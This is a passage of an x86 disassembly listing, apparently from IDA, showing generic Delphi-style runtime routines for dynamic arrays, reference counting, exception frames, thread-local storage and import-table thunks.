                mov     eax, [eax-4]

locret_2D6F:                            ; CODE XREF: sub_2D68+2↑j
                retn
sub_2D68        endp


; =============== S U B R O U T I N E =======================================


sub_2D70        proc near               ; CODE XREF: sub_5F48+E1↓p
                                        ; sub_5F48+107↓p
                call    sub_2D68
                dec     eax
                retn
sub_2D70        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_2D78        proc near               ; CODE XREF: sub_2D98+106↓p

arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                push    [ebp+arg_0]
                call    sub_2C6C
                pop     ebp
                retn    4
sub_2D78        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_2D88        proc near               ; CODE XREF: sub_2D98+B0↓p
                jmp     sub_2A4C
sub_2D88        endp

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_2D90        proc near               ; CODE XREF: sub_2D98+2F↓p
                call    sub_2F30
                retn
sub_2D90        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_2D98        proc near               ; CODE XREF: sub_2D98+173↓p
                                        ; sub_2F24+5↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFE0h
                push    ebx
                push    esi
                push    edi
                mov     [ebp+var_8], ecx
                mov     esi, edx
                mov     [ebp+var_4], eax
                mov     ebx, [ebp+var_4]
                mov     ebx, [ebx]
                mov     eax, [ebp+arg_0]
                mov     edi, [eax]
                test    edi, edi
                jg      short loc_2DD1
                test    edi, edi
                jge     short loc_2DC2
                mov     al, 4
                call    sub_1930
; ---------------------------------------------------------------------------

loc_2DC2:                               ; CODE XREF: sub_2D98+21↑j
                mov     eax, [ebp+var_4]
                mov     edx, esi
                call    sub_2D90
                jmp     loc_2F1B
; ---------------------------------------------------------------------------

loc_2DD1:                               ; CODE XREF: sub_2D98+1D↑j
                xor     eax, eax
                mov     [ebp+var_10], eax
                test    ebx, ebx
                jz      short loc_2DE5
                sub     ebx, 4
                mov     eax, [ebx]
                mov     [ebp+var_10], eax
                sub     ebx, 4

loc_2DE5:                               ; CODE XREF: sub_2D98+40↑j
                xor     eax, eax
                mov     al, [esi+1]
                add     esi, eax
                mov     eax, esi
                mov     edx, [eax+2]
                mov     [ebp+var_18], edx
                mov     edx, [eax+6]
                test    edx, edx
                jz      short loc_2DFF
                mov     esi, [edx]
                jmp     short loc_2E01
; ---------------------------------------------------------------------------

loc_2DFF:                               ; CODE XREF: sub_2D98+61↑j
                xor     esi, esi

loc_2E01:                               ; CODE XREF: sub_2D98+65↑j
                mov     eax, edi
                imul    [ebp+var_18]
                mov     [ebp+var_1C], eax
                mov     eax, [ebp+var_1C]
                cdq
                idiv    edi
                cmp     eax, [ebp+var_18]
                jz      short loc_2E1B
                mov     al, 4
                call    sub_1930
; ---------------------------------------------------------------------------

loc_2E1B:                               ; CODE XREF: sub_2D98+7A↑j
                add     [ebp+var_1C], 8
                test    ebx, ebx
                jz      short loc_2E28
                cmp     dword ptr [ebx], 1
                jnz     short loc_2E5D

loc_2E28:                               ; CODE XREF: sub_2D98+89↑j
                mov     [ebp+var_20], ebx
                cmp     edi, [ebp+var_10]
                jge     short loc_2E4D
                test    esi, esi
                jz      short loc_2E4D
                mov     eax, ebx
                add     eax, 8
                mov     edx, edi
                imul    edx, [ebp+var_18]
                add     eax, edx
                mov     ecx, [ebp+var_10]
                sub     ecx, edi
                mov     edx, esi
                call    sub_2D88

loc_2E4D:                               ; CODE XREF: sub_2D98+96↑j
                                        ; sub_2D98+9A↑j
                lea     eax, [ebp+var_20]
                mov     edx, [ebp+var_1C]
                call    sub_1888
                mov     ebx, [ebp+var_20]
                jmp     short loc_2EBB
; ---------------------------------------------------------------------------

loc_2E5D:                               ; CODE XREF: sub_2D98+8E↑j
                dec     dword ptr [ebx]
                mov     eax, [ebp+var_1C]
                call    sub_1848
                mov     ebx, eax
                mov     eax, [ebp+var_10]
                mov     [ebp+var_14], eax
                cmp     edi, [ebp+var_14]
                jge     short loc_2E77
                mov     [ebp+var_14], edi

loc_2E77:                               ; CODE XREF: sub_2D98+DA↑j
                test    esi, esi
                jz      short loc_2EA5
                mov     edx, [ebp+var_14]
                imul    edx, [ebp+var_18]
                mov     eax, ebx
                add     eax, 8
                xor     ecx, ecx
                call    sub_1A60
                mov     eax, [ebp+var_14]
                push    eax
                mov     edx, [ebp+var_4]
                mov     edx, [edx]
                mov     eax, ebx
                add     eax, 8
                mov     ecx, esi
                call    sub_2D78
                jmp     short loc_2EBB
; ---------------------------------------------------------------------------

loc_2EA5:                               ; CODE XREF: sub_2D98+E1↑j
                mov     ecx, [ebp+var_14]
                imul    ecx, [ebp+var_18]
                mov     edx, ebx
                add     edx, 8
                mov     eax, [ebp+var_4]
                mov     eax, [eax]
                call    sub_194C

loc_2EBB:                               ; CODE XREF: sub_2D98+C3↑j
                                        ; sub_2D98+10B↑j
                mov     dword ptr [ebx], 1
                add     ebx, 4
                mov     [ebx], edi
                add     ebx, 4
                mov     edx, edi
                sub     edx, [ebp+var_10]
                imul    edx, [ebp+var_18]
                mov     eax, [ebp+var_18]
                imul    eax, [ebp+var_10]
                add     eax, ebx
                xor     ecx, ecx
                call    sub_1A60
                cmp     [ebp+var_8], 1
                jle     short loc_2F16
                add     [ebp+arg_0], 4
                dec     [ebp+var_8]
                dec     edi
                test    edi, edi
                jl      short loc_2F16
                inc     edi
                mov     [ebp+var_C], 0

loc_2EFC:                               ; CODE XREF: sub_2D98+17C↓j
                mov     eax, [ebp+arg_0]
                push    eax
                mov     eax, [ebp+var_C]
                lea     eax, [ebx+eax*4]
                mov     ecx, [ebp+var_8]
                mov     edx, esi
                call    sub_2D98
                inc     [ebp+var_C]
                dec     edi
                jnz     short loc_2EFC

loc_2F16:                               ; CODE XREF: sub_2D98+14E↑j
                                        ; sub_2D98+15A↑j
                mov     eax, [ebp+var_4]
                mov     [eax], ebx

loc_2F1B:                               ; CODE XREF: sub_2D98+34↑j
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_2D98        endp


; =============== S U B R O U T I N E =======================================


sub_2F24        proc near               ; CODE XREF: sub_5F48+94↓p

var_4           = dword ptr -4

                push    esp
                add     [esp+4+var_4], 4
                call    sub_2D98
                retn
sub_2F24        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_2F30        proc near               ; CODE XREF: sub_2A4C+D0↑p
                                        ; sub_2D90↑p ...
                mov     ecx, [eax]
                test    ecx, ecx
                jz      short locret_2F69
                mov     dword ptr [eax], 0
                lock dec dword ptr [ecx-8]
                jnz     short locret_2F69
                push    eax
                mov     eax, ecx
                xor     ecx, ecx
                mov     cl, [edx+1]
                mov     edx, [ecx+edx+6]
                test    edx, edx
                jz      short loc_2F60
                mov     ecx, [eax-4]
                test    ecx, ecx
                jz      short loc_2F60
                mov     edx, [edx]
                call    sub_2A4C

loc_2F60:                               ; CODE XREF: sub_2F30+20↑j
                                        ; sub_2F30+27↑j
                sub     eax, 8
                call    sub_1868
                pop     eax

locret_2F69:                            ; CODE XREF: sub_2F30+4↑j
                                        ; sub_2F30+10↑j
                retn
sub_2F30        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2F6C        proc near               ; CODE XREF: sub_2B50+EF↑p
                                        ; sub_2C6C+DD↑p
                push    ebx
                mov     ebx, [eax]
                test    edx, edx
                jz      short loc_2F77
                lock inc dword ptr [edx-8]

loc_2F77:                               ; CODE XREF: sub_2F6C+5↑j
                test    ebx, ebx
                jz      short loc_2F8F
                lock dec dword ptr [ebx-8]
                jnz     short loc_2F8F
                push    eax
                push    edx
                mov     edx, ecx
                inc     dword ptr [ebx-8]
                call    sub_2F30
                pop     edx
                pop     eax

loc_2F8F:                               ; CODE XREF: sub_2F6C+D↑j
                                        ; sub_2F6C+13↑j
                mov     [eax], edx
                pop     ebx
                retn
sub_2F6C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_2F94        proc near               ; CODE XREF: sub_3000+1B↓p

var_8           = dword ptr -8
var_4           = dword ptr -4

; FUNCTION CHUNK AT 00001E04 SIZE 00000104 BYTES

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF8h
                push    ebx
                push    esi
                push    edi
                mov     [ebp+var_4], eax
                mov     eax, ds:40902Ch
                mov     [ebp+var_8], eax
                cmp     [ebp+var_8], 0
                jz      short loc_2FE7

loc_2FAE:                               ; CODE XREF: sub_2F94+51↓j
                xor     eax, eax
                push    ebp
                push    403BCFh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     ebx, [ebp+var_8]
                mov     eax, [ebp+var_4]
                call    dword ptr [ebx+4]
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                jmp     short loc_2FD9
; ---------------------------------------------------------------------------
                jmp     loc_1E04
; ---------------------------------------------------------------------------
                call    sub_1FBC

loc_2FD9:                               ; CODE XREF: sub_2F94+39↑j
                mov     eax, [ebp+var_8]
                mov     eax, [eax]
                mov     [ebp+var_8], eax
                cmp     [ebp+var_8], 0
                jnz     short loc_2FAE

loc_2FE7:                               ; CODE XREF: sub_2F94+18↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_2F94        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_2FF0        proc near               ; CODE XREF: sub_3308+5↓p
                mov     edx, ds:409028h
                mov     [eax], edx
                mov     ds:409028h, eax
                retn
sub_2FF0        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_3000        proc near               ; CODE XREF: sub_23A4+70↑p

var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                push    ecx
                mov     [ebp+var_4], eax
                xor     edx, edx
                push    ebp
                push    403C64h
                push    dword ptr fs:[edx]
                mov     fs:[edx], esp
                mov     eax, [ebp+var_4]
                mov     eax, [eax+4]
                call    sub_2F94
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    403C6Bh

loc_302D:                               ; CODE XREF: CODE:00003069↓j
                mov     eax, [ebp+var_4]
                cmp     eax, ds:409028h
                jnz     short loc_3044
                mov     eax, [ebp+var_4]
                mov     eax, [eax]
                mov     ds:409028h, eax
                jmp     short locret_3063
; ---------------------------------------------------------------------------

loc_3044:                               ; CODE XREF: sub_3000+36↑j
                mov     eax, ds:409028h
                test    eax, eax
                jz      short locret_3063

loc_304D:                               ; CODE XREF: sub_3000+61↓j
                mov     edx, [eax]
                cmp     edx, [ebp+var_4]
                jnz     short loc_305D
                mov     edx, [ebp+var_4]
                mov     edx, [edx]
                mov     [eax], edx
                jmp     short locret_3063
; ---------------------------------------------------------------------------

loc_305D:                               ; CODE XREF: sub_3000+52↑j
                mov     eax, [eax]
                test    eax, eax
                jnz     short loc_304D

locret_3063:                            ; CODE XREF: sub_3000+42↑j
                                        ; sub_3000+4B↑j ...
                retn
sub_3000        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_302D
; ---------------------------------------------------------------------------
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3070        proc near               ; CODE XREF: sub_2A4C+BF↑p
                mov     edx, [eax]
                test    edx, edx
                jz      short locret_3084
                mov     dword ptr [eax], 0
                push    eax
                push    edx
                mov     eax, [edx]
                call    dword ptr [eax+8]
                pop     eax

locret_3084:                            ; CODE XREF: sub_3070+4↑j
                retn
sub_3070        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3088        proc near               ; CODE XREF: sub_2B50+DC↑p
                                        ; sub_2C6C+C7↑p
                test    edx, edx
                jz      short loc_30A5
                push    edx
                push    eax
                mov     eax, [edx]
                push    edx
                call    dword ptr [eax+4]
                pop     eax
                mov     ecx, [eax]
                pop     dword ptr [eax]
                test    ecx, ecx
                jnz     short loc_309E
                retn
; ---------------------------------------------------------------------------

loc_309E:                               ; CODE XREF: sub_3088+13↑j
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]
                retn
; ---------------------------------------------------------------------------

loc_30A5:                               ; CODE XREF: sub_3088+2↑j
                mov     ecx, [eax]
                test    ecx, ecx
                mov     [eax], edx
                jz      short locret_30B3
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

locret_30B3:                            ; CODE XREF: sub_3088+23↑j
                retn
sub_3088        endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_30B4        proc near               ; CODE XREF: CODE:00003229↓p
                                        ; CODE:0000323A↓p

var_10          = dword ptr -10h
var_B           = byte ptr -0Bh
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF0h
                push    ebx
                xor     edx, edx
                mov     [ebp+var_10], edx
                xor     edx, edx
                push    ebp
                push    403D1Ah
                push    dword ptr fs:[edx]
                mov     fs:[edx], esp
                push    7
                lea     edx, [ebp+var_B]
                push    edx
                push    1004h
                push    eax
                call    sub_448
                lea     eax, [ebp+var_10]
                lea     edx, [ebp+var_B]
                mov     ecx, 7
                call    sub_25F4
                mov     eax, [ebp+var_10]
                lea     edx, [ebp+var_4]
                call    sub_1A9C
                mov     ebx, eax
                cmp     [ebp+var_4], 0
                jz      short loc_3104
                xor     ebx, ebx

loc_3104:                               ; CODE XREF: sub_30B4+4C↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    403D21h

loc_3111:                               ; CODE XREF: CODE:0000311F↓j
                lea     eax, [ebp+var_10]
                call    sub_2494
                retn
sub_30B4        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3111
; ---------------------------------------------------------------------------
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    403D72h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A5A4h
                jnz     short loc_3164
                mov     eax, 40A038h
                call    sub_1998
                mov     eax, 40A204h
                call    sub_1998
                mov     eax, 40A3D0h
                call    sub_1998
                call    sub_C4C

loc_3164:                               ; CODE XREF: CODE:0000313F↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    403D79h

loc_3171:                               ; CODE XREF: CODE:00003177↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3171
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A5A4h, 1
                jnb     locret_324E
                mov     byte ptr ds:40900Ch, 2
                mov     dword ptr ds:40A010h, 401008h
                mov     dword ptr ds:40A014h, 401010h
                mov     byte ptr ds:40A036h, 2
                mov     dword ptr ds:40A000h, 403960h
                call    sub_1C08
                test    al, al
                jz      short loc_31C3
                call    sub_1C38

loc_31C3:                               ; CODE XREF: CODE:000031BC↑j
                call    sub_1CFC
                mov     word ptr ds:40A03Ch, 0D7B0h
                mov     word ptr ds:40A208h, 0D7B0h
                mov     word ptr ds:40A3D4h, 0D7B0h
                call    sub_440
                mov     ds:40A02Ch, eax
                call    sub_498
                mov     ds:40A028h, eax
                call    sub_490
                and     eax, 80000000h
                cmp     eax, 80000000h
                jz      short loc_3235
                call    sub_490
                and     eax, 0FFh
                cmp     ax, 4
                jbe     short loc_3224
                mov     dword ptr ds:40A5A8h, 3
                jmp     short loc_3244
; ---------------------------------------------------------------------------

loc_3224:                               ; CODE XREF: CODE:00003216↑j
                call    sub_458
                call    sub_30B4
                mov     ds:40A5A8h, eax
                jmp     short loc_3244
; ---------------------------------------------------------------------------

loc_3235:                               ; CODE XREF: CODE:00003206↑j
                call    sub_458
                call    sub_30B4
                mov     ds:40A5A8h, eax

loc_3244:                               ; CODE XREF: CODE:00003222↑j
                                        ; CODE:00003233↑j
                call    sub_488
                mov     ds:40A020h, eax

locret_324E:                            ; CODE XREF: CODE:00003183↑j
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3250        proc near               ; CODE XREF: sub_3314+C↓p
                jmp     dword ptr ds:415168h
sub_3250        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3258        proc near               ; CODE XREF: sub_3270+3↓p
                jmp     dword ptr ds:415164h
sub_3258        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3260        proc near               ; CODE XREF: sub_32C8+25↓p
                                        ; sub_32C8+36↓p
                jmp     dword ptr ds:415160h
sub_3260        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3268        proc near               ; CODE XREF: sub_3284+3D↓p
                jmp     dword ptr ds:41515Ch
sub_3268        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3270        proc near               ; CODE XREF: sub_3284+21↓p
                push    eax
                push    40h ; '@'
                call    sub_3258
                retn
sub_3270        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_327C        proc near               ; CODE XREF: sub_3284+1↓p
                mov     eax, 8
                retn
sub_327C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3284        proc near               ; CODE XREF: sub_32C8:loc_32E2↓p
                push    ebx
                call    sub_327C
                mov     ebx, eax
                test    ebx, ebx
                jz      short loc_32C6
                cmp     dword ptr ds:409090h, 0FFFFFFFFh
                jnz     short loc_32A3
                mov     eax, 0E2h
                call    sub_2488
; ---------------------------------------------------------------------------

loc_32A3:                               ; CODE XREF: sub_3284+13↑j
                mov     eax, ebx
                call    sub_3270
                test    eax, eax
                jnz     short loc_32BA
                mov     eax, 0E2h
                call    sub_2488
; ---------------------------------------------------------------------------
                jmp     short loc_32C6
; ---------------------------------------------------------------------------

loc_32BA:                               ; CODE XREF: sub_3284+28↑j
                push    eax
                mov     eax, ds:409090h
                push    eax
                call    sub_3268

loc_32C6:                               ; CODE XREF: sub_3284+A↑j
                                        ; sub_3284+34↑j
                pop     ebx
                retn
sub_3284        endp


; =============== S U B R O U T I N E =======================================


sub_32C8        proc near               ; CODE XREF: sub_18E4+20↑p
                                        ; sub_193C+3↑p ...
                mov     cl, ds:40A64Ch
                mov     eax, ds:409090h
                test    cl, cl
                jnz     short loc_32FD
                mov     edx, large fs:2Ch
                mov     eax, [edx+eax*4]
                retn
; ---------------------------------------------------------------------------

loc_32E2:                               ; CODE XREF: sub_32C8+3D↓j
                call    sub_3284
                mov     eax, ds:409090h
                push    eax
                call    sub_3260
                test    eax, eax
                jz      short loc_32F7
                retn
; ---------------------------------------------------------------------------

loc_32F7:                               ; CODE XREF: sub_32C8+2C↑j
                mov     eax, ds:40A658h
                retn
; ---------------------------------------------------------------------------

loc_32FD:                               ; CODE XREF: sub_32C8+D↑j
                push    eax
                call    sub_3260
                test    eax, eax
                jz      short loc_32E2
                retn
sub_32C8        endp


; =============== S U B R O U T I N E =======================================


sub_3308        proc near               ; CODE XREF: sub_3314+2E↓p
                mov     eax, 409094h
                call    sub_2FF0
                retn
sub_3308        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3314        proc near               ; CODE XREF: CODE:000074FD↓p
                push    ebx
                mov     ebx, eax
                xor     eax, eax
                mov     ds:409090h, eax
                push    0
                call    sub_3250
                mov     ds:40A650h, eax
                mov     eax, ds:40A650h
                mov     ds:409098h, eax
                xor     eax, eax
                mov     ds:40909Ch, eax
                xor     eax, eax
                mov     ds:4090A0h, eax
                call    sub_3308
                mov     edx, 409094h
                mov     eax, ebx
                call    sub_224C
                pop     ebx
                retn
sub_3314        endp

; ---------------------------------------------------------------------------
                align 4
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    403F7Dh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A654h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    403F84h

loc_337C:                               ; CODE XREF: CODE:00003382↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_337C
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A654h, 1
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    403FB5h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A65Ch
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    403FBCh

loc_33B4:                               ; CODE XREF: CODE:000033BA↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_33B4
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                sub     dword ptr ds:40A65Ch, 1
                retn
; ---------------------------------------------------------------------------
                db 0CCh
                db 3Fh, 40h, 0
                dd 42480701h, 414D5449h, 550h, 0FFFF0000h, 0C08BFFFFh

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_33E0        proc near               ; CODE XREF: sub_4BCC+5↓p
                jmp     dword ptr ds:415178h
sub_33E0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_33E8        proc near               ; CODE XREF: sub_4B5C+18↓p
                jmp     dword ptr ds:415174h
sub_33E8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_33F0        proc near               ; CODE XREF: sub_4B8C+2B↓p
                jmp     dword ptr ds:415170h
sub_33F0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_33F8        proc near               ; CODE XREF: sub_3F90+1↓p
                jmp     dword ptr ds:4151ECh
sub_33F8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3400        proc near               ; CODE XREF: sub_42B0+D↓p
                jmp     dword ptr ds:4151E8h
sub_3400        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3408        proc near               ; CODE XREF: sub_3F68+20↓p
                jmp     dword ptr ds:4151E4h
sub_3408        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3410        proc near               ; CODE XREF: sub_3418+16↓p
                jmp     dword ptr ds:4151E0h
sub_3410        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_3418        proc near               ; CODE XREF: sub_699C+42↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_8]
                push    eax
                cmp     [ebp+arg_4], 1
                sbb     eax, eax
                inc     eax
                and     eax, 7Fh
                push    eax
                mov     eax, [ebp+arg_0]
                push    eax
                call    sub_3410
                pop     ebp
                retn    0Ch
sub_3418        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3438        proc near               ; CODE XREF: sub_4600+5F↓p
                                        ; sub_6DA0+6D↓p
                jmp     dword ptr ds:4151DCh
sub_3438        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3440        proc near               ; CODE XREF: sub_436C+12↓p
                                        ; sub_4480+12B↓p ...
                jmp     dword ptr ds:4151D8h
sub_3440        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3448        proc near               ; CODE XREF: sub_436C+8↓p
                                        ; sub_4480+BB↓p ...
                jmp     dword ptr ds:4151D4h
sub_3448        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3450        proc near               ; CODE XREF: sub_4480+11B↓p
                                        ; sub_4A34+103↓p
                jmp     dword ptr ds:4151D0h
sub_3450        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3458        proc near               ; CODE XREF: CODE:00006108↓p
                jmp     dword ptr ds:4151CCh
sub_3458        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3460        proc near               ; CODE XREF: sub_3DD0:loc_3E23↓p
                jmp     dword ptr ds:4151C8h
sub_3460        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3468        proc near               ; CODE XREF: sub_6140+49↓p
                jmp     dword ptr ds:4151C4h
sub_3468        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3470        proc near               ; CODE XREF: sub_3F9C+6↓p
                                        ; sub_40F8+1↓p ...
                jmp     dword ptr ds:4151C0h
sub_3470        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3478        proc near               ; CODE XREF: CODE:00004DEA↓p
                                        ; sub_5204+15↓p
                jmp     dword ptr ds:4151BCh
sub_3478        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3480        proc near               ; CODE XREF: sub_699C+49↓p
                jmp     dword ptr ds:4151B8h
sub_3480        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3488        proc near               ; CODE XREF: sub_4BD8+8↓p
                jmp     dword ptr ds:4151B4h
sub_3488        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3490        proc near               ; CODE XREF: sub_6140+30↓p
                jmp     dword ptr ds:4151B0h
sub_3490        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_3498        proc near               ; CODE XREF: sub_3DD0+39↓p
                jmp     dword ptr ds:4151ACh
sub_3498        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34A0        proc near               ; CODE XREF: sub_4334+1E↓p
                jmp     dword ptr ds:4151A8h
sub_34A0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34A8        proc near               ; CODE XREF: sub_4408+2E↓p
                jmp     dword ptr ds:4151A4h
sub_34A8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34B0        proc near               ; CODE XREF: sub_4390+2E↓p
                jmp     dword ptr ds:4151A0h
sub_34B0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34B8        proc near               ; CODE XREF: sub_3FC4+B↓p
                jmp     dword ptr ds:41519Ch
sub_34B8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34C0        proc near               ; CODE XREF: sub_699C+A0↓p
                jmp     dword ptr ds:415198h
sub_34C0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34C8        proc near               ; CODE XREF: CODE:00006CD0↓p
                jmp     dword ptr ds:415194h
sub_34C8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34D0        proc near               ; CODE XREF: sub_5250+2E↓p
                jmp     dword ptr ds:415190h
sub_34D0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34D8        proc near               ; CODE XREF: sub_65D0+15A↓p
                                        ; sub_65D0+291↓p ...
                jmp     dword ptr ds:41518Ch
sub_34D8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34E0        proc near               ; CODE XREF: sub_3FB4+8↓p
                jmp     dword ptr ds:415188h
sub_34E0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34E8        proc near               ; CODE XREF: sub_719C+B9↓p
                jmp     dword ptr ds:415184h
sub_34E8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_34F0        proc near               ; CODE XREF: sub_3FE0+A↓p
                jmp     dword ptr ds:415180h
sub_34F0        endp

; ---------------------------------------------------------------------------
                align 4

